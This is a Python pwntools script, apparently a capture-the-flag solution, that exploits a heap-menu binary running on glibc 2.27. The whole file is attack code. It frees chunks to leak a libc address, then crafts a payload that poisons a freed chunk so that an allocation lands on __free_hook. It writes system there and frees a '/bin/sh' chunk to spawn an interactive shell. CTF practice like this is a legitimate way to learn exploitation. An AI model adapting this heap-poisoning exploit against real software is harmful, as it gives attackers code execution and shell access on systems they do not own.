from pwn import *
elf = ELF("./pwn")
p = elf.process()
libc = ELF('/home/ld1ng/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so')
one_gadget = 0x0

def add(index, size):
    p.sendlineafter(">> \n", "1")
    p.sendlineafter("input index\n", str(index))
    p.sendlineafter("input size\n", str(size))


def delete(index):
    p.sendlineafter(">> \n", "2")
    p.sendlineafter("input index\n", str(index))


def edit(index, content):
    p.sendlineafter(">> \n", "3")
    p.sendlineafter("input index\n", str(index))
    p.sendafter("input content\n", content)

def show(index):
    p.sendlineafter(">> \n", "4")
    p.sendlineafter("input index\n", str(index))

def leave_name(name):
    p.sendlineafter(">> \n", "5")
    p.sendafter("your name:\n", name)

def show_name():
    p.sendlineafter(">> \n", "6")

for i in range(11):
    add(i, 0x18)
for i in range(7):
    delete(i + 4)

delete(0)
delete(1)
delete(2)
delete(3)
leave_name("Ld1ng")
show_name()
show(0)
libc.address = u64(p.recvline().strip('\n').ljust(8, b"\x00")) -0x3ebd10
#- 0xd0 - 0x10 - libc.sym['__malloc_hook']
for i in range(7):
    add(i + 4, 0x18)
log.success("libc address is {}".format(hex(libc.address)))
add(11, 0x60)
delete(1)
payload = b"a"*0x10 + p64(0x61) + p64(libc.sym['__free_hook'] - 0x8)
payload += b"b"*0x10 + p64(0x21) + b"/bin/sh\x00"
edit(11, payload)
# gdb.attach(p)
add(12, 0x50)
add(13, 0x50)
edit(13, p64(libc.sym['system']))
delete(2)
p.interactive()